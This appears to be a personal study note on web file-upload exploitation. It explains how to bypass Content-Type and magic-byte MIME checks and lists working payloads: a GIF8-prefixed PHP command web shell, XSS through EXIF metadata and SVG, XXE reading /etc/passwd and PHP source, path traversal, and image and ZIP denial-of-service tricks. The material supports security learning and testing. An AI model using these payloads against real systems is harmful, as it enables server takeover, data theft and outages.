# File Upload - Type Filters (Content-Type & MIME Type) , XXE

### Why Extension Check Isn't Enough?

- Attackers can upload web shells using names like `shell.jpg.php` or `shell.php.jpg`
- Some files (e.g., `.svg`) are inherently scriptable and can carry XXE, XSS, or other payloads
- Solution: Validate file content, not just extension
### Type Filtering Techniques

#### 1. Content-Type Header Check

- Value comes from browser’s request
- Set automatically by browser (based on file extension)
- ✅ Can be manipulated (client-side)

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, ['image/jpg', 'image/jpeg', 'image/png', 'image/gif'])) {
    die("Only images are allowed");
}
```
##### Bypass:
- Use Burp Intruder or Repeater to change the header:

```http
Content-Type: image/jpeg
```

- Extension: `.php`
- Payload: PHP web shell
- ✅ Upload success → `shell.php?cmd=id`
#### Wordlist for Content-Type Fuzzing:

```bash
wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt
cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```
#### 2. MIME-Type Validation

- Server inspects magic bytes of the file
- Uses function:

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);
```
##### Bypass:

- Prepend GIF magic bytes (`GIF8`) to your PHP shell

```php
GIF8<?php system($_GET['cmd']); ?>
```

- MIME type will show: `image/gif`
- ✅ Upload success → Still executes as `.php`
### MIME vs Content-Type (Differences)

| Aspect           | Content-Type                | MIME-Type (via PHP)           |
| ---------------- | --------------------------- | ----------------------------- |
| Source           | HTTP header (browser-sent)  | File content inspection       |
| Manipulable?     | ✅ Yes (Burp or dev tools)   | ❌ No (server-side function)   |
| Detection Method | Based on filename/extension | Based on file magic bytes |
### Combined Bypass Strategy
##### Try permutations of:

- ✅ Allowed MIME + ❌ Disallowed Content-Type
- ✅ Allowed MIME + ❌ Disallowed extension
- ❌ Disallowed MIME + ✅ Allowed extension
- MIME spoofing (e.g., GIF8) + `Content-Type: image/png` 
- `.php` shell that passes content filter due to fake header
### Wordlists Used

- `SecLists/Discovery/Web-Content/web-all-content-types.txt`
     -  Used for Content-Type fuzzing
	-  Filtered using: `grep 'image/'` → `image-content-types.txt`
# Limited File Uploads
### What Are They?

- Upload forms that **don’t allow arbitrary file types**
- Only specific types (like images or docs) are permitted
- Still exploitable with techniques like:
    - ❗ XSS via metadata or SVG
    - ❗ XXE via XML/SVG/office formats
    - ❗ DoS via compression bombs or oversized images/files
## Stored XSS via File Upload
### A. HTML Payload

- HTML files may include inline JavaScript
- If rendered: `alert(document.domain)` works
### B. Metadata Injection

```bash
exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' image.jpg
```

- If web app displays **EXIF metadata** → XSS gets triggered
### C. SVG Injection

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(window.origin);</script>
</svg>
```

- SVGs are XML-based → easily scriptable    
- Rendered as image but **JavaScript executes**
## 2. XXE via SVG / XML
### A. Local File Disclosure

```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

- Server includes file contents
### B. PHP Source Code Disclosure

```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

- View source code of `index.php` in Base64 
### C. XXE in Other Docs

- Office files, PDFs, etc. contain embedded XML
- Can carry same XXE logic

> Can also lead to **SSRF**: Internal services discovery or API abuse
## 3. DoS via File Upload
### A. XXE-Based DoS

- Billion laughs / recursive entity definitions  
### B. Decompression Bomb (ZIP)

- Nested ZIP files → exponential unpacking    
- Crashes or fills disk on extraction
### C. Pixel Flood Attack (Image DoS)

```text
Original: 500x500 JPG
Tampered header: 65535x65535 → 4Gpx
```

- Image rendering causes memory exhaustion    
### D. Oversized File Upload

- No size restriction → disk full → app crash   
### E. Path Traversal

```bash
../../../../etc/passwd
```

- Can overwrite system files or force write to invalid paths   
## Wordlists Used

- None specified for this module
- Reuse previous ones like:
    - **image-content-types.txt**
    - **PHP extensions**        
    - **SVG payload samples**        

> 📎 Keep these in `wordlists/` or reference via:  
> `https://github.com/danielmiessler/SecLists`  
> `https://github.com/swisskyrepo/PayloadsAllTheThings`
# Tags
>  #Web-Exploitation #Exploitation #File-Upload-Attacks